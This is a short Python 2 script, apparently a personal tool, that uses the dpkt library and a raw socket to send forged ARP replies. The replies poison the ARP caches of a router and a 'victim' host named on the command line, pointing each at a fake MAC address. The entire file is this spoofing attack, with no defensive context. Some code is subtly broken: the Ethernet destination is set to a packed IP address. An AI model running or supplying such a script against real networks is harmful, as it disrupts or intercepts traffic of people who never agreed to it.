import socket
from dpkt import ethernet,arp
import dpkt
import struct
import string
import sys
import signal


class pair(object):
	def __init__(self,smac,sip,rmac,rip):
		#TODO add automatic retrive methos
		self.smac = smac
		self.sip = sip
		self.rmac = rmac
		self.rip = rip

def eth_ntoa(buffer):
	# Convert binary data into a string.
	macaddr = ''
	for intval in struct.unpack('BBBBBB', buffer):
		if intval > 15:
			replacestr = '0x'
		else:
			replacestr = 'x'
		macaddr = ''.join([macaddr, hex(intval).replace(replacestr, '')])
	return macaddr

def eth_aton(buffer):
	addr =''
	temp = string.split(buffer,':')
	buffer = string.join(temp,'')
	# Split up the hex values and pack.
	for i in range(0, len(buffer), 2):
		addr = ''.join([addr,struct.pack('B', int(buffer[i: i + 2], 16))],)
	return addr


def buildArpReq(addr):
	arp_p = arp.ARP()
	arp_p.sha = eth_aton(mac)          # sender hardware addr
	arp_p.spa = socket.inet_aton(inet) # sender ip addr
	arp_p.tha = ETH_ADDR_UNSPEC        # dest hardware addr
	arp_p.tpa = socket.inet_aton(addr) # ip addr of request
	arp_p.op = arp.ARP_OP_REQUEST

	packet = ethernet.Ethernet()
	packet.src = eth_aton(mac)
	packet.dst = ETH_ADDR_BROADCAST
	packet.data = arp_p
	packet.type = ethernet.ETH_TYPE_ARP

	if debug: print dpkt.hexdump(str(packet))

	return packet

def buildArpReply(pair):
	arp_p = arp.ARP()
	arp_p.sha = eth_aton(pair.smac)          # sender hardware addr
	arp_p.spa = socket.inet_aton(pair.sip) # sender ip addr
	arp_p.tha = eth_aton(pair.rmac)        # dest hardware addr
	arp_p.tpa = socket.inet_aton(pair.rip) # ip addr of request
	arp_p.op = arp.ARP_OP_REPLY

	packet = ethernet.Ethernet()
	packet.src = eth_aton(pair.smac)
	packet.dst =  socket.inet_aton(pair.sip)
	packet.data = arp_p
	packet.type = ethernet.ETH_TYPE_ARP

	if debug: print dpkt.hexdump(str(packet))

	return packet

def quit(signum,frame):
	print "Scan ended.."
	sys.exit(0)

if __name__ == "__main__":

	iface = "wlan0"
	mac   = "00:09:5B:98:0D:85"
	inet  = "10.29.1.61"

	debug = True

	signal.alarm(2)
	signal.signal(signal.SIGALRM,quit)

	s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
	s.bind((iface,ethernet.ETH_TYPE_ARP))

	# this should be somewhere is dpkt ?
	ETH_ADDR_BROADCAST = 'ff:ff:ff:ff:ff:ff'
	IP_ADDR_BROADCAST = '255.255.255.255'
	ETH_ADDR_UNSPEC = '00:00:00:00:00:00'
	WRONG_HA = '00:98:5B:4A:0A:5A'
	#correct mac address 18:e7:f4:78:4e:40

	routerha = sys.argv[1]
	routerpa = sys.argv[2]
	victimha = sys.argv[3]
	victimpa = sys.argv[4]

	for a in sys.argv:
			print a

	pair1 = pair(WRONG_HA,routerpa,victimha,victimpa)
	packet = buildArpReply(pair1)
	s.send(str(packet))

	pair2 =	pair(WRONG_HA,victimpa,routerha,routerpa)
	packet2 = buildArpReply(pair2)
	s.send(str(packet2))

	print "Send..."
